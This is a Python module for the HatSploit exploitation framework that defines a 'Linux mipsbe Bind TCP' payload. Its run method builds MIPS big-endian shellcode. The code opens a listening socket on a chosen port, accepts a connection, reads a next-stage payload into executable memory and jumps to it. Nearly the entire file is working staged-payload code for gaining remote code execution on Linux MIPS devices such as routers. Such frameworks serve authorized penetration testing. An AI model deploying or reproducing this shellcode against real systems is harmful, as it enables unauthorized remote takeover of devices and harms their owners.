"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *


class HatSploitPayload(Payload, Handler):
    def __init__(self):
        super().__init__({
            'Name': "Linux mipsbe Bind TCP",
            'Payload': "linux/mipsbe/bind_tcp",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': (
                "This payload creates an interactive bind TCP connection for Linux "
                "with MIPS big-endian architecture and reads next phase."
            ),
            'Arch': ARCH_MIPSBE,
            'Platform': OS_LINUX,
            'Type': BIND_TCP,
        })

        self.reliable = BooleanOption('PhaseReliable', 'no', "Add error checks to payload.",
                                      False, advanced=True)
        self.length = IntegerOption('PhaseLength', 4096, "Length of next phase.",
                                    False, advanced=True)

    def run(self):
        assembly = """
        start:
            addiu $sp, $sp, -0x20
            addiu $t6, $zero, -3
            not $a0, $t6
            not $a1, $t6
            slti $a2, $zero, -1
            addiu $v0, $zero, 0x1057
            syscall 0x40404
        """

        if self.reliable.value:
            assembly += """
                slt     $s0, $zero, $a3
                bne     $s0, $zero, fail
            """

        assembly += f"""
            andi $s0, $v0, 0xffff
            addiu $t6, $zero, -0x11
            not $t6, $t6
            addiu $t5, $zero, -3
            not $t5, $t5
            sllv $t5, $t5, $t6
            addiu $t6, $zero, 0x{self.rport.big.hex()}
            or $t5, $t5, $t6
            sw $t5, -0x20($sp)
            sw $zero, -0x1c($sp)
            sw $zero, -0x18($sp)
            sw $zero, -0x14($sp)
            or $a0, $s0, $s0
            addiu $t6, $zero, -0x11
            not $a2, $t6
            addi $a1, $sp, -0x20
            addiu $v0, $zero, 0x1049
            syscall 0x40404
        """

        if self.reliable.value:
            assembly += """
                slt     $s0, $zero, $a3
                bne     $s0, $zero, fail
            """

        assembly += """
            or $a0, $s0, $s0
            addiu $a1, $zero, 0x101
            addiu $v0, $zero, 0x104e
            syscall 0x40404
        """

        if self.reliable.value:
            assembly += """
                slt     $s0, $zero, $a3
                bne     $s0, $zero, fail
            """

        assembly += """
            or $a0, $s0, $s0
            slti $a1, $zero, -1
            slti $a2, $zero, -1
            addiu $v0, $zero, 0x1048
            syscall 0x40404
        """

        if self.reliable.value:
            assembly += """
                slt     $s0, $zero, $a3
                bne     $s0, $zero, fail
            """

        assembly += f"""
            sw $v0, -1($sp)
            addiu   $a0, $zero, -1
            addiu   $a1, $zero, {hex(self.length.value + 1)}
            addi    $a1, $a1, -1
            addiu   $t1, $zero, -8
            not     $t1, $t1
            add     $a2, $t1, $zero
            addiu   $a3, $zero, 0x802
            addiu   $t3, $zero, -0x16
            not     $t3, $t3
            add     $t3, $sp, $t3
            sw      $zero, -1($t3)
            sw      $v0, -5($t3)
            addiu   $v0, $zero, 0xffa
            syscall 0x40404
        """

        if self.reliable.value:
            assembly += """
                slt     $s0, $zero, $a3
                bne     $s0, $zero, fail
            """

        assembly += f"""
            sw      $v0, -4($sp)
            lw      $a0, -1($sp)
            lw      $a1, -4($sp)
            addiu   $a2, $zero, {hex(self.length.value + 1)}
            addi    $a2, $a2, -1
            addiu   $v0, $zero, 0xfa3
            syscall 0x40404
        """

        if self.reliable.value:
            assembly += """
                slt     $s0, $zero, $a3
                bne     $s0, $zero, fail
            """

        assembly += f"""
            lw      $a0, -4($sp)
            add     $a1, $v0, $zero
            addiu   $t1, $zero, -3
            not     $t1, $t1
            add     $a2, $t1, $zero
            addiu   $v0, $zero, 0x1033
            syscall 0x40404
        """

        if self.reliable.value:
            assembly += """
                slt     $s0, $zero, $a3
                bne     $s0, $zero, fail
            """

        assembly += """
            lw      $s1, -4($sp)
            lw      $s2, -1($sp)
            jalr    $s1
        """

        if self.reliable.value:
            assembly += """
            fail:
                addiu $a0, $zero, 1
                addiu $v0, $zero, 0xfa1
                syscall 0x40404
            """

        return self.assemble(assembly)
